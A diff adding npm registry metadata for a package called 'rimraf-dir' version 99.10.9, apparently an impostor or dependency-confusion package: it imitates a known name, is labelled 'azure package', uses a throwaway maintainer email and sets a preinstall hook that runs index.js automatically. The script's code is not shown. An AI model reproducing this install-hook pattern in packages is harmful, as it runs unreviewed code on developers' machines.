@@ -1,0 +1,62 @@
+{
+    "_id": "rimraf-dir",
+    "name": "rimraf-dir",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "rimraf-dir",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "rimraf-dir@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-XC+l6h8c7o0YmH6KExTiISJ41pS4Hs89SX5ghe1vi8Du9cgOlEoTEKwun/Y7jDi88PCqlQAq0LVrIW/DXtP7Tw==",
+                "shasum": "1717c3c1b2f55c782240543442c337eafac819cc",
+                "tarball": "https://registry.npmjs.org/rimraf-dir/-/rimraf-dir-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5062,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO7ggACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmozIw//Sl1DpkDdZXlQYVl7BN51uN6HPQZmhi5THcw8rfG93snPm0Nh\r\nqsnj3QVZ7btPpKBRDztPTplK37N8OkReT2JxTK/1uSDLGVpviMx/cyXPX5jp\r\nvFdbvBdP5yGykgCFAY5/Zhsc7FEsQVDvrN4oI4t1Yl3Fj01QMcuacrruUwlC\r\nqO1jZ9lACXr0RTowHm1q1Bfo7PD3hGkX7CHHUiiS+YqD9ZZylUl/ebgaBM3Y\r\nGvF9nF8r/kFK9uADLliDNUIi8hEWxpN5eobc7dhLNKG2DEZEURBfDhPH7PCL\r\nhtIQpGRqHueo9Gfw0SiMFYHL81X6we9Zk1YYH2OOA+63pPd1M8rBIATwaiTz\r\nFvZqSbGcJNxp2TVDu5D7yaNo8JEB9zgg/Wo3vYKfz+RGoBlfHauUFqtjH0+X\r\naPVBq9Vy0x/l/2maEtVYNqa91B4RrMRGRGRrjGVfEp9f1Q0r+yLU1zemqwx5\r\nbX6C/lDPn5zNeZKkHYTysWbwwlUhe2LSTpzCkPkQ0nx6WqPbgJlrXJCTxf0Y\r\nDMj3ISbo0byFo1TJaiXjdXyl8Vl0ic+MPjp2jJyF216fHgdsCf4XGbqyw1hP\r\nrhg3yG1cZlTD58XgrjxGpmhmqSvVzl7h8YsA2CVi0NfGCcWHM8iP10W7XFsv\r\nZROnj1yP5dpp404eFqfNybUgmNQ98mXxn3E=\r\n=NJOt\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "cnttz3am",
+                "email": "cnttz3am@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "cnttz3am",
+                    "email": "cnttz3am@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/rimraf-dir_99.10.9_1648080928542_0.23637692163197355"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T00:15:28.541Z",
+        "99.10.9": "2022-03-24T00:15:28.658Z",
+        "modified": "2022-03-24T00:15:28.772Z"
+    },
+    "maintainers": [
+        {
+            "name": "cnttz3am",
+            "email": "cnttz3am@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
